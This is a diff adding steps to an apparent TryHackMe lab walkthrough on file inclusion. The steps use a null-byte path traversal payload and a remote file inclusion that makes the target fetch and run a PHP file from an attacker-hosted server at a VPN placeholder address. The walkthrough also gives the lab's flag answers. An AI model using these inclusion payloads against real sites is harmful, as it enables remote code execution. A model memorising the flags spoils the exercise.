@@ -88,3 +88,15 @@
 6. In the error message we can see that they removed all special characters and numbers from the payload.
 7. Change the request method to post and send the request, in this we can see nothing is being stripped out, so the application is probably using `$_REQUESTS`.
 8. Try the payload: `/etc/flag3%00` for the flag: `P0st_1s_w0rk1in9`.
+
+#### Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?
+1. Go to `/playground.php`.
+2. Enter `gohan` and send.
+3. Create a directory and create a file `mouse.txt` with this text:
+    ```
+    <?php echo exec("hostname"); ?>
+    ```
+4. Run this command after `cd`ing into the new directory: `python3 -m http.server`
+5. This will start a server on port `8000`.
+6. Replace the value of `file` param with `http://<THM-VPN-IP>:8000/mouse.txt` and submit.
+7. The flag: `lfi-vm-thm-f8c5b1a78692`.
